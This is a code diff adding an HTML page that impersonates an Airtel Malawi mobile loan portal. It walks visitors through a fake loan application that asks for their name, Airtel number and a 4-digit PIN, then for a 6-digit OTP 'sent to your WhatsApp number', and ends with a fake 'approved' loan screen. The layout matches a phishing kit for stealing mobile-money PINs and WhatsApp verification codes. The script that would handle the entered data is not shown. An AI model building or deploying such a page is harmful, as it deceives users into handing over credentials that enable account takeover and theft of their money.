@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Malawi Mobile Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app-container">
+  
+  <!-- Header -->
+  <header class="top-header">
+    <div class="brand-logo">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+      </svg>
+      <span class="brand-title">Airtel Malawi</span>
+    </div>
+    <span class="flag-badge">🇲🇼</span>
+  </header>
+
+  <!-- SCREEN 0: WELCOME NOTICE -->
+  <section id="screen-welcome" class="screen active">
+    <h1 style="font-size: 24px; color: var(--primary-red); text-align: center; margin-top: 10px;">Welcome to Airtel Malawi!</h1>
+    <p style="text-align: center; color: var(--text-muted); margin-top: 6px;">Your trusted mobile money platform for a brighter tomorrow.</p>
+
+    <div class="notice-box">
+      <h2>IMPORTANT NOTICE</h2>
+      <p>Only <strong>Airtel Malawi</strong> mobile subscribers are eligible to apply for this official service.</p>
+      <div class="warning-callout">
+        Please ensure you are using an active Airtel Malawi phone number before proceeding.
+      </div>
+    </div>
+
+    <button id="btn-welcome-proceed" class="btn-primary" style="margin-top: auto;">
+      I UNDERSTAND & PROCEED →
+    </button>
+  </section>
+
+  <!-- SCREEN 1: APPLICATION STEPS 1 OF 3 -->
+  <section id="screen-step1" class="screen">
+    <h2 style="margin-bottom: 6px;">Loan Application</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 1 of 3: Loan Details</p>
+
+    <div class="form-group">
+      <label for="loan-type">Loan Category</label>
+      <select id="loan-type">
+        <option value="Business Loan">Business Loan</option>
+        <option value="Personal Loan">Personal Loan</option>
+        <option value="Emergency Loan">Emergency Loan</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="loan-amount">Loan Amount (MWK)</label>
+      <input type="number" id="loan-amount" class="input-field" value="100000" placeholder="Enter amount in MWK">
+    </div>
+
+    <div class="form-group">
+      <label for="loan-duration">Repayment Duration</label>
+      <select id="loan-duration">
+        <option value="12 Months">12 Months</option>
+        <option value="24 Months">24 Months</option>
+        <option value="36 Months">36 Months</option>
+        <option value="48 Months">48 Months</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label for="loan-purpose">Loan Purpose</label>
+      <input type="text" id="loan-purpose" class="input-field" placeholder="Describe loan purpose...">
+    </div>
+
+    <button id="btn-step1-next" class="btn-primary" style="margin-top: auto;">NEXT STEP →</button>
+  </section>
+
+  <!-- SCREEN 2: APPLICATION STEP 2 OF 3 (PERSONAL & PHONE) -->
+  <section id="screen-step2" class="screen">
+    <h2 style="margin-bottom: 6px;">Loan Application</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 2 of 3: Applicant Verification</p>
+
+    <div class="form-group">
+      <label for="first-name">First Name</label>
+      <input type="text" id="first-name" class="input-field" placeholder="Enter first name">
+    </div>
+
+    <div class="form-group">
+      <label for="last-name">Last Name</label>
+      <input type="text" id="last-name" class="input-field" placeholder="Enter last name">
+    </div>
+
+    <div class="form-group">
+      <label for="phone-number">Airtel Malawi Mobile Number</label>
+      <input type="tel" id="phone-number" class="input-field" placeholder="e.g. 0991234567" maxlength="10">
+      <span id="phone-error" class="error-text">Please enter a valid Airtel Malawi number (099, 098, 088, 077).</span>
+    </div>
+
+    <div class="form-group">
+      <label>Enter 4-Digit PIN</label>
+      <div class="pin-grid">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+        <input type="password" class="pin-digit" maxlength="1" inputmode="numeric">
+      </div>
+      <span id="pin-error" class="error-text">Please enter a 4-digit numeric PIN.</span>
+    </div>
+
+    <div style="display: flex; gap: 10px; margin-top: auto;">
+      <button id="btn-step2-back" class="btn-secondary">BACK</button>
+      <button id="btn-step2-next" class="btn-primary" style="margin-top: 0;">NEXT STEP →</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 3: APPLICATION STEP 3 OF 3 (SUMMARY) -->
+  <section id="screen-step3" class="screen">
+    <h2 style="margin-bottom: 6px;">Loan Application</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Step 3 of 3: Final Confirmation</p>
+
+    <div class="summary-card">
+      <div class="summary-row">
+        <span class="summary-label">Loan Amount:</span>
+        <span id="sum-amount" class="summary-val">MWK 100,000</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Duration:</span>
+        <span id="sum-duration" class="summary-val">48 Months</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Category:</span>
+        <span id="sum-category" class="summary-val">Business Loan</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Applicant:</span>
+        <span id="sum-name" class="summary-val">-</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Mobile Number:</span>
+        <span id="sum-phone" class="summary-val">-</span>
+      </div>
+    </div>
+
+    <div style="display: flex; gap: 10px; margin-top: auto;">
+      <button id="btn-step3-back" class="btn-secondary">BACK</button>
+      <button id="btn-step3-submit" class="btn-primary" style="margin-top: 0;">SUBMIT APPLICATION</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 4: OTP VERIFICATION (STEP 1 & STEP 2) -->
+  <section id="screen-otp" class="screen">
+    <h2 style="margin-bottom: 6px;">OTP Verification</h2>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+      Verification code sent to <strong id="otp-phone-display">099XXXXXXX</strong>
+    </p>
+
+    <!-- RED WHATSAPP NOTIFICATION BANNER -->
+    <div class="whatsapp-notice">
+      <p>⚠️ PLEASE ENTER THE OTP SENT TO YOUR WHATSAPP NUMBER. ONLY NUMBERS ARE ALLOWED!</p>
+    </div>
+
+    <div class="form-group" style="text-align: center;">
+      <div class="pin-grid">
+        <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
+        <input type="text" class="otp-digit" maxlength="1" inputmode="numeric">
+      </div>
+      <span id="otp-error" class="error-text">Please enter a valid numeric OTP.</span>
+    </div>
+
+    <button id="btn-submit-otp" class="btn-primary" style="margin-top: 20px;">SUBMIT OTP</button>
+  </section>
+
+  <!-- SCREEN 5: CONGRATULATIONS / SUCCESS -->
+  <section id="screen-success" class="screen">
+    <div style="text-align: center; margin-top: 20px;">
+      <div style="width: 70px; height: 70px; background-color: #E6F4EA; color: var(--accent-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; margin: 0 auto 16px;">
+        ✓
+      </div>
+      <h1 style="color: var(--primary-red); font-size: 26px; margin-bottom: 8px;">Congratulations!</h1>
+      <p style="color: var(--text-muted); font-size: 15px;">Your loan application has been <strong>approved</strong>! Funds will be disbursed shortly.</p>
+    </div>
+
+    <div style="background-color: var(--primary-red); color: #FFFFFF; border-radius: 16px; padding: 20px; text-align: center; margin: 24px 0;">
+      <span style="font-size: 13px; text-transform: uppercase; letter-spacing: 1px; opacity: 0.9;">APPROVED AMOUNT</span>
+      <div id="approved-amount-display" style="font-size: 32px; font-weight: 800; margin-top: 6px;">MWK 100,000</div>
+    </div>
+
+    <div class="summary-card">
+      <div class="summary-row">
+        <span class="summary-label">Monthly Payment:</span>
+        <span class="summary-val">MWK 2,441</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Loan Tenure:</span>
+        <span class="summary-val">48 Months</span>
+      </div>
+      <div class="summary-row">
+        <span class="summary-label">Interest Rate:</span>
+        <span class="summary-val">8% APR</span>
+      </div>
+    </div>
+
+    <button id="btn-go-home" class="btn-primary" style="margin-top: auto;">RETURN HOME</button>
+  </section>
+
+  <!-- LOADING OVERLAY -->
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <h3 id="loading-title" style="margin-bottom: 8px;">Processing Application...</h3>
+    <p id="loading-sub" style="color: var(--text-muted); font-size: 14px;">Please wait while we verify your details with Airtel Malawi.</p>
+  </div>
+
+</div>
+
+<script src="script.js"></script>
+</body>
+        </html>
+        
